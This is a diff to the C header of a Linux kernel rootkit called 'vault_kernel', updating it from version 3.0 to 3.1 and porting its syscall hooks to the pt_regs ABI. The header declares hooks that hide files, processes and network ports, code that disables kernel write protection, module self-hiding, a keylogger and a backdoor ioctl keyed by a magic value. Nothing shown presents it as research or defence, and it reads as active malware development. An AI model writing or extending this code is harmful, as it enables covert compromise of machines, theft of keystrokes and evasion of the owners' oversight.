@@ -8,6 +8,7 @@
 #include <linux/version.h>
 #include <linux/list.h>
 #include <linux/string.h>
+#include <linux/ctype.h>
 #include <linux/uaccess.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
@@ -38,12 +39,11 @@
 #include <linux/pid.h>
 #include <asm/cacheflush.h>
 #include <asm/io.h>
-#include <asm/uaccess.h>
 #include <asm/unistd.h>
 
 /* -- Module metadata -- */
 #define VAULT_KERNEL_NAME    "vault_kernel"
-#define VAULT_KERNEL_VERSION "3.0"
+#define VAULT_KERNEL_VERSION "3.1"
 #define VAULT_KERNEL_AUTHOR  "ruby570bocadito"
 #define VAULT_KERNEL_TAG     "[vault_kernel]"
 
@@ -51,7 +51,7 @@
 #define CLASS_NAME       "vault_kernel"
 
 /* -- Syscall hook definitions -- */
-#define MAX_HOOKS        12
+#define MAX_HOOKS        8
 #define MAX_HIDDEN_FILES 128
 #define MAX_HIDDEN_PIDS  64
 #define MAX_HIDDEN_PORTS 32
@@ -74,6 +74,31 @@
 #define IOCTL_BACKDOOR_MAGIC   _IOW(VAULT_KERNEL_MAGIC, 0x0C, char[16])
 #define IOCTL_MODULE_HIDE      _IO(VAULT_KERNEL_MAGIC, 0x0D)
 #define IOCTL_MODULE_UNHIDE    _IO(VAULT_KERNEL_MAGIC, 0x0E)
+#define IOCTL_GET_STATS        _IOR(VAULT_KERNEL_MAGIC, 0x0F, char[4096])
+
+/* ================================================================
+ * Syscall ABI compatibility (x86_64)
+ *
+ * Since Linux 4.17, sys_call_table entries on x86_64 point to
+ * __x64_sys_* stubs that receive a SINGLE `struct pt_regs *`
+ * argument; the real syscall parameters live inside pt_regs
+ * (di/si/dx/r10/r8/r9).  Hooking with the old direct-argument
+ * ABI silently corrupts every call on every kernel >= 4.17.
+ *
+ * This module therefore implements ONLY the pt_regs ABI and
+ * refuses to build against anything older.  PTREGS_SYSCALL_STUBS
+ * is normally provided by <asm/syscall_wrapper.h>; the fallback
+ * below covers kernels where it is not exported to modules.
+ * ================================================================ */
+#ifndef PTREGS_SYSCALL_STUBS
+#  if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
+#    define PTREGS_SYSCALL_STUBS 1
+#  endif
+#endif
+
+#if !defined(PTREGS_SYSCALL_STUBS) || !defined(CONFIG_X86_64)
+#  error "vault_kernel v3.1 requires an x86_64 kernel >= 4.17 (pt_regs syscall ABI)"
+#endif
 
 /* -- Hooked syscall entry -- */
 struct hooked_syscall {
@@ -93,6 +118,7 @@ extern unsigned long *sys_call_table;
 extern struct hooked_syscall hooks[];
 extern int hooks_count;
 extern int module_hidden;
+extern unsigned long vk_load_jiffies;
 
 /* Hook indices (used across files) */
 #define HOOKIDX_GETDENTS64  0
@@ -100,15 +126,14 @@ extern int module_hidden;
 #define HOOKIDX_OPENAT      2
 #define HOOKIDX_READ        3
 #define HOOKIDX_KILL        4
-#define HOOKIDX_WRITE       5
-#define HOOKIDX_UNLINKAT    6
+#define HOOKIDX_UNLINKAT    5
 
 /* Exposed arrays for ioctl listing */
 extern char hidden_files[MAX_HIDDEN_FILES][256];
 extern int hidden_file_count;
 extern int hidden_pids[MAX_HIDDEN_PIDS];
 extern int hidden_pid_count;
-extern uint16_t hidden_ports[MAX_HIDDEN_PORTS];
+extern uint16_t hidden_ports[MAX_HIDDEN_PORTS];   /* host byte order */
 extern int hidden_port_count;
 
 /* -- Function declarations -- */
@@ -121,16 +146,13 @@ int disable_wp(void);
 void restore_wp(int saved_cr0);
 int install_hook(struct hooked_syscall *h);
 void remove_hook(struct hooked_syscall *h);
+int hooking_installed_count(void);
 
 /* file_hide.c */
-asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp,
-                                   unsigned int count);
-asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp,
-                                  unsigned int count);
-asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
-                               int flags, umode_t mode);
-asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname, int flags);
-asmlinkage long hooked_write(unsigned int fd, const char __user *buf, size_t count);
+asmlinkage long hooked_getdents64(const struct pt_regs *regs);
+asmlinkage long hooked_getdents(const struct pt_regs *regs);
+asmlinkage long hooked_openat(const struct pt_regs *regs);
+asmlinkage long hooked_unlinkat(const struct pt_regs *regs);
 void file_hide_add(const char *name);
 void file_hide_del(const char *name);
 int file_hide_init(void);
@@ -144,20 +166,20 @@ int proc_hide_init(void);
 void proc_hide_cleanup(void);
 int is_pid_hidden(int pid);
 int is_proc_pid_hidden(const char *d_name);
-asmlinkage long hooked_kill(pid_t pid, int sig);
+asmlinkage long hooked_kill(const struct pt_regs *regs);
 
 /* net_hide.c */
 void net_hide_add_port(uint16_t port);
 void net_hide_del_port(uint16_t port);
 int net_hide_init(void);
 void net_hide_cleanup(void);
-asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf,
-                               size_t count);
+asmlinkage long hooked_read(const struct pt_regs *regs);
 
 /* keylogger.c */
 int keylogger_init(void);
 void keylogger_cleanup(void);
 int keylogger_read(char __user *buf, size_t count);
+size_t keylogger_len(void);
 void keylogger_clear(void);
 
 /* backdoor.c */
